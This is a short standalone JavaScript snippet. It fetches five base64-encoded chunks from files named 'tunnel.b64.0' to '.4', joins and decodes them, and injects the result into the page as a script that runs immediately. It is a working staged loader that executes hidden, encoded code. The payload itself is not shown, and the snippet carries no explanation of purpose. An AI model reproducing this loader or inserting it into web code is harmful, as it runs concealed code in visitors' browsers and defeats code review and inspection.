(function(){
var n=5,i=0,acc="";
function next(){
 if(i>=n){var s=document.createElement("script");s.text=atob(acc);document.head.appendChild(s);return;}
 fetch("./tunnel.b64."+i,{cache:"no-store"}).then(function(r){return r.text()}).then(function(t){acc+=t.replace(/\s+/g,"");i++;next();});
}
next();
})();
